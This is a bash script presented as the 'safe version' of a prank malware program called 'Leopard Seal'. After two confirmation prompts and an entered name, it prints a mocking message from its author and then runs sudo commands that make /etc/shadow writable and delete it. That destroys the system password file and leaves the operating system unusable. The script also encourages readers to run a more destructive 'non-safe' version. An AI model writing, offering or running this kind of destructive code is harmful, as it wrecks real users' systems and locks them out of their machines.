#!/bin/bash

DELAY=30 # Number of seconds to display results

failsafe() {
  clear
  echo "Exiting."
  sleep 2s
  exit
}

club_penguin() {
  clear
  echo "LEAPORD SEAL"
  sleep 3s
  echo ""
  echo "Uh Oh! The penguin has been eaten by the Leopard Seal!"
  sleep 3s
  echo ""
  echo "Hey."
  sleep 2s
  echo ""
  echo "I'm Ness."
  sleep 2s
  echo "The creator of this program."
  sleep 2s
  echo ""
  echo "Now, you're an absolute wimp."
  sleep 2s
  echo "Yes, you. The one doing this."
  sleep 2s
  echo ""
  echo "You want to mess up this PC, but you're using the safe version!"
  sleep 2s
  echo "I'm OK with you using the safe mode if there's some important stuff on this PC, though."
  sleep 3s
  echo "I've definetly had my fair share of important drives."
  sleep 2s
  echo ""
  echo "But if this is a Raspberry Pi or something, geez!"
  sleep 2s
  echo "Close this terminal and boot up the non-safe version!"
  sleep 2s
  echo ""
  echo "Anyway, thanks for listening."
  sleep 2s
  echo "Here's what you need to know:"
  sleep 2s
  echo "Your data will still be fine, you can recover it externally."
  sleep 2s
  echo "The safe version of Leopard Seal only invalidates the OS."
  sleep 2s
  echo ""
  echo "So, I'm just going to do that now."
  sleep 2s
  echo "Cya."
  sleep 1s
  cd /
  cd etc
  sudo chmod a+w shadow
  sudo rm shadow
  exit
}

enter_name() {
  clear
  echo ""
  echo "                          Enter the name of this program:"
  echo ""
  echo ""
  echo ""
  echo ""
  echo ""
  echo -n "                            Program Name: "
  read selection
  clear
  echo ""
  case $selection in
    "Leopard Seal" ) clear ; club_penguin ;;
    * ) clear ; failsafe ;; 
esac
}

are_you_sure() {
  clear
  echo "ARE YOU SURE?"
  echo ""
  echo "Press 2 to proceed or press anything else to exit."
  echo ""
  read -n1 -s -r -p $'' key

if [ "$key" = '2' ]; then
  enter_name
else
    failsafe
  fi
}


while true; do 
  clear
echo "WARNING: THIS IS A MALWARE THAT WILL MAKE THIS PC UNUSABLE."
echo "ARE YOU SURE YOU WANT TO PROCEED?" 
echo ""
echo "Press 4 to proceed or press anything else to exit."
echo ""

  read -n1 -s -r -p $'' key

if [ "$key" = '4' ]; then
  are_you_sure
else
    failsafe
  fi
done
echo "Exiting."
